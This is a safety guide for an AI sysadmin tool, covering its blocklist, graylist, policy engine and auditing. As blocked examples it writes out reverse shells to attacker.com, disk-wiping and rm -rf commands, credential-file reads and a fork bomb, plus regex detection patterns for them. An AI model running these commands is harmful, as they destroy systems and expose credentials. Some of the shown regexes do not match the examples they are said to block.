# Safety Guide

## Overview

The Kimi Sysadmin AI implements comprehensive safety controls to protect your systems from accidental or malicious damage. This guide explains how these protections work and how to configure them for your environment.

## Table of Contents

1. [Safety Architecture](#safety-architecture)
2. [Blocklist Protection](#blocklist-protection)
3. [Graylist Confirmation](#graylist-confirmation)
4. [Policy Engine](#policy-engine)
5. [Safety Patterns](#safety-patterns)
6. [Configuration](#configuration)
7. [Auditing](#auditing)
8. [Emergency Procedures](#emergency-procedures)

## Safety Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     Command Input                           │
└─────────────────────────┬───────────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: Safety Filter                                     │
│  ├─ Blocklist: 99 patterns (immediate rejection)           │
│  └─ Graylist: 86 patterns (requires confirmation)          │
└─────────────────────────┬───────────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: Policy Engine                                     │
│  ├─ OPA/Rego policies (if available)                       │
│  └─ Python fallback rules                                  │
└─────────────────────────┬───────────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: Execution Environment                             │
│  ├─ Host executor (with user restrictions)                 │
│  ├─ Docker executor (containerized)                        │
│  └─ Kubernetes executor (namespace-scoped)                 │
└─────────────────────────────────────────────────────────────┘
```

## Blocklist Protection

### Always Blocked Commands

The following commands are **never allowed**:

#### Mass Deletion
```bash
# BLOCKED: rm -rf /
rm -rf /
rm -rf /*
rm -rf /home/*
rm -rf --no-preserve-root /

# BLOCKED: Wildcard deletion
rm -rf /path/*
rm -rf *.log
```

#### Filesystem Destruction
```bash
# BLOCKED: Formatting filesystems
mkfs.ext4 /dev/sda1
mkfs.xfs /dev/sdb
newfs /dev/disk0

# BLOCKED: Direct disk writes
dd if=/dev/zero of=/dev/sda
dd if=/dev/urandom of=/dev/nvme0n1
dd if=image.iso of=/dev/mmcblk0
```

#### Reverse Shells
```bash
# BLOCKED: All reverse shell patterns
bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/sh attacker.com 4444
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
ruby -rsocket -e 'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Credential Access
```bash
# BLOCKED: Sensitive file access
cat /etc/shadow
cat /etc/master.passwd
cat /root/.ssh/id_rsa
cat /home/*/.ssh/authorized_keys
cat ~/.aws/credentials
cat ~/.config/gcloud/credentials.db
```

#### System Destruction
```bash
# BLOCKED: Fork bomb
:(){ :|:& };:

# BLOCKED: Kernel panic
echo c > /proc/sysrq-trigger
```

### Blocklist Response

When a blocked command is detected:

```python
from kimi_sysadmin_ai import SafetyFilter

filter = SafetyFilter()
result = filter.check("rm -rf /")

print(result.level)    # SafetyLevel.BLOCK
print(result.reason)   # "Command matches dangerous pattern: rm -rf /"

# Execution is prevented
# Event is logged
# Alert can be sent to security team
```

## Graylist Confirmation

### Commands Requiring Confirmation

The following commands require **explicit user confirmation**:

#### Package Management
```bash
# GRAY: Package installation/removal
apt install nginx
apt-get remove package
pip install requests
npm uninstall lodash
yum update
dnf install docker
```

#### Service Management
```bash
# GRAY: Service control
systemctl restart nginx
service mysql stop
systemctl enable docker
```

#### Container Operations
```bash
# GRAY: Docker/Kubernetes
docker run -d nginx
docker rm container_id
kubectl delete pod my-pod
kubectl apply -f deployment.yaml
```

#### Permission Changes
```bash
# GRAY: Dangerous permission changes
chmod -R 777 /var/www
chown -R user:group /
```

### Confirmation Flow

```python
from kimi_sysadmin_ai import HostExecutor

executor = HostExecutor(require_confirmation=True)

# This will prompt for confirmation
result = await executor.execute("apt update")

# Output:
# ⚠️  Command requires confirmation:
#    Command: apt update
#    Reason: Package management operation
# Execute? [y/N]: 
```

### Programmatic Confirmation

```python
# Pre-approved gray commands
result = await executor.execute(
    "apt update",
    confirm=True  # Skip interactive prompt
)
```

## Policy Engine

### OPA/Rego Integration

The Policy Engine supports Open Policy Agent (OPA) for advanced policy definitions:

```rego
# policy.rego
package sysadmin

import future.keywords.if
import future.keywords.in

default allow := false

# Allow read-only commands
allow if {
    input.command in ["ls", "cat", "grep", "ps", "df", "du", "top"]
}

# Allow specific users
allow if {
    input.user == "deploy"
    startswith(input.command, "docker ")
}

# Deny destructive commands
deny if {
    input.user != "root"
    regex.match("^(rm|mkfs|dd)", input.command)
}

# Require confirmation for package management
gray if {
    regex.match("^(apt|yum|pip|npm)", input.command)
}
```

### Python Fallback

When OPA is not available, the Python backend provides default rules:

```python
from kimi_sysadmin_ai import PolicyEngine, PolicyInput

engine = PolicyEngine(use_opa=False)  # Use Python backend

input_data = PolicyInput(
    command="ls -la",
    user="admin",
    working_dir="/home/admin",
    environment={"PATH": "/usr/bin"}
)

result = engine.evaluate(input_data)
print(result.decision)  # PolicyDecision.ALLOW
```

### Custom Policies

```python
from kimi_sysadmin_ai.policy_engine import PythonBackend

# Define custom rules
custom_rules = [
    {
        "name": "allow_deployment_user",
        "description": "Allow deployment user to restart services",
        "condition": {
            "user": "deploy",
            "command_patterns": ["^systemctl restart (nginx|app)"]
        },
        "action": "allow"
    },
    {
        "name": "block_production_database",
        "description": "Never allow direct database access in production",
        "condition": {
            "environment": {"ENV": "production"},
            "command_patterns": ["mysql", "psql", "mongo"]
        },
        "action": "deny"
    }
]

engine = PythonBackend(policy_rules=custom_rules)
```

## Safety Patterns

### Pattern Matching

Safety patterns use regular expressions for flexible matching:

```python
# Block pattern examples
BLOCKLIST = [
    # Mass deletion - matches rm -rf /, rm -rf /*, etc.
    r'rm\s+-[a-zA-Z]*r[a-zA-Z]*\s+/',
    
    # Reverse shells - various forms
    r'bash\s+-i\s*>&\s*/dev/tcp/',
    r'nc\s+-[a-zA-Z]*e[a-zA-Z]*\s+.*\d+',
    
    # Credential access
    r'cat\s+/etc/shadow',
    r'cat\s+/root/\.ssh/',
]

GRAYLIST = [
    # Package management
    r'apt\s+(install|remove|purge)',
    r'pip\s+(install|uninstall)',
    
    # Service control
    r'systemctl\s+(start|stop|restart)',
    
    # Containers
    r'docker\s+(run|exec|rm)',
    r'kubectl\s+(delete|apply)',
]
```

### Adding Custom Patterns

```python
from kimi_sysadmin_ai.safety import SafetyFilter
import re

class CustomSafetyFilter(SafetyFilter):
    def __init__(self):
        super().__init__()
        
        # Add custom block patterns
        self.block_patterns.append(
            re.compile(r'custom_dangerous_command', re.IGNORECASE)
        )
        
        # Add custom gray patterns
        self.gray_patterns.append(
            re.compile(r'sensitive_operation', re.IGNORECASE)
        )

filter = CustomSafetyFilter()
```

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `SYSADMIN_REQUIRE_CONFIRMATION` | Require confirmation for gray commands | `true` |
| `SYSADMIN_MAX_TIMEOUT` | Maximum command timeout (seconds) | `300` |
| `SYSADMIN_LOG_LEVEL` | Logging level | `INFO` |
| `OPA_URL` | OPA server URL | `http://localhost:8181` |
| `OPA_ENABLED` | Enable OPA integration | `true` |

### Configuration File

```yaml
# sysadmin-config.yaml
safety:
  require_confirmation: true
  max_timeout: 300
  
  blocklist:
    additional_patterns:
      - "custom_dangerous.*"
    
  graylist:
    additional_patterns:
      - "semi_sensitive.*"
    exclude_patterns:
      - "apt list.*"  # Don't require confirmation for apt list

policy:
  opa:
    enabled: true
    url: http://localhost:8181
    policy_file: /etc/kimi/policies/default.rego
  
  python_fallback: true

logging:
  level: INFO
  audit_log: /var/log/kimi/audit.log
```

### Runtime Configuration

```python
from kimi_sysadmin_ai import HostExecutor, SafetyFilter, PolicyEngine

# Configure at runtime
safety = SafetyFilter()
policy = PolicyEngine(
    opa_url="http://opa:8181",
    use_opa=True
)

executor = HostExecutor(
    safety_filter=safety,
    policy_engine=policy,
    require_confirmation=True,
    working_dir="/safe/directory"
)
```

## Auditing

### Audit Logging

All command execution is logged for security review:

```python
import logging
from kimi_sysadmin_ai import HostExecutor

# Setup audit logging
audit_logger = logging.getLogger("kimi.audit")
audit_logger.setLevel(logging.INFO)

handler = logging.FileHandler("/var/log/kimi/audit.log")
formatter = logging.Formatter(
    '%(asctime)s - %(levelname)s - %(message)s'
)
handler.setFormatter(formatter)
audit_logger.addHandler(handler)

class AuditedExecutor(HostExecutor):
    async def execute(self, command, confirm=False):
        # Log the attempt
        audit_logger.info(f"EXECUTE_ATTEMPT: {command}")
        
        # Check safety
        safety_result = self.safety_filter.check(command)
        audit_logger.info(f"SAFETY_CHECK: {safety_result.level.value}")
        
        if safety_result.level.value == "block":
            audit_logger.warning(f"BLOCKED_COMMAND: {command}")
            raise SecurityError(f"Command blocked: {safety_result.reason}")
        
        # Execute
        result = await super().execute(command, confirm)
        
        # Log result
        audit_logger.info(
            f"EXECUTE_COMPLETE: {command} "
            f"(exit={result.returncode}, duration={result.duration})"
        )
        
        return result
```

### Audit Log Format

```
2024-01-15 10:30:00 - INFO - EXECUTE_ATTEMPT: ls -la
2024-01-15 10:30:00 - INFO - SAFETY_CHECK: safe
2024-01-15 10:30:00 - INFO - POLICY_CHECK: allow
2024-01-15 10:30:00 - INFO - EXECUTE_COMPLETE: ls -la (exit=0, duration=0.05)

2024-01-15 10:31:00 - INFO - EXECUTE_ATTEMPT: rm -rf /
2024-01-15 10:31:00 - INFO - SAFETY_CHECK: block
2024-01-15 10:31:00 - WARNING - BLOCKED_COMMAND: rm -rf /
```

### SIEM Integration

```python
import json
import httpx

class SIEMAuditor:
    def __init__(self, siem_url: str, api_key: str):
        self.siem_url = siem_url
        self.api_key = api_key
    
    async def log_event(self, event_type: str, data: dict):
        payload = {
            "timestamp": datetime.utcnow().isoformat(),
            "source": "kimi-sysadmin-ai",
            "event_type": event_type,
            "data": data
        }
        
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{self.siem_url}/api/events",
                json=payload,
                headers={"Authorization": f"Bearer {self.api_key}"}
            )
```

## Emergency Procedures

### Immediate Lockdown

If you suspect compromise:

```python
from kimi_sysadmin_ai import SafetyFilter

# Enable emergency mode - block everything except essential commands
class EmergencySafetyFilter(SafetyFilter):
    def check(self, command: str):
        # Only allow essential read-only commands
        allowed = ["ls", "cat", "ps", "df", "whoami"]
        
        if not any(command.strip().startswith(cmd) for cmd in allowed):
            return SafetyResult(
                level=SafetyLevel.BLOCK,
                reason="Emergency mode: only essential commands allowed",
                command=command
            )
        
        return super().check(command)
```

### Incident Response

```python
async def incident_response(command: str, user: str):
    """Handle potential security incident."""
    
    # Log incident
    logger.critical(f"SECURITY_INCIDENT: {user} attempted: {command}")
    
    # Notify security team
    await notify_security_team(
        f"Blocked dangerous command from {user}: {command}"
    )
    
    # Disable user if repeated attempts
    if await get_recent_blocks(user) > 5:
        await disable_user(user)
        logger.critical(f"USER_DISABLED: {user}")
```

### Recovery

```bash
# Review audit logs
grep "BLOCKED_COMMAND" /var/log/kimi/audit.log

# Check for successful dangerous commands
grep "EXECUTE_COMPLETE" /var/log/kimi/audit.log | grep -E "(rm|mkfs|dd)"

# Generate incident report
kimi-admin audit-report --since "2024-01-15" --format pdf
```

## Best Practices

### 1. Principle of Least Privilege

```python
# Run with minimal permissions
executor = HostExecutor(
    working_dir="/app",
    allowed_paths=["/app", "/tmp"]
)
```

### 2. Defense in Depth

```python
# Multiple safety layers
safety = SafetyFilter()           # Pattern matching
policy = PolicyEngine()           # Business rules
executor = HostExecutor(          # Execution environment
    safety_filter=safety,
    policy_engine=policy
)
```

### 3. Regular Review

```bash
# Weekly audit review
kimi-admin audit-report --since "7 days ago"

# Monthly policy review
kimi-admin policy-review --format markdown
```

### 4. Testing

```python
# Test safety filters
async def test_safety():
    executor = HostExecutor()
    
    # Should be blocked
    with pytest.raises(SecurityError):
        await executor.execute("rm -rf /")
    
    # Should require confirmation
    result = executor.safety_filter.check("apt update")
    assert result.level == SafetyLevel.GRAY
    
    # Should be allowed
    result = await executor.execute("ls -la")
    assert result.returncode == 0
```
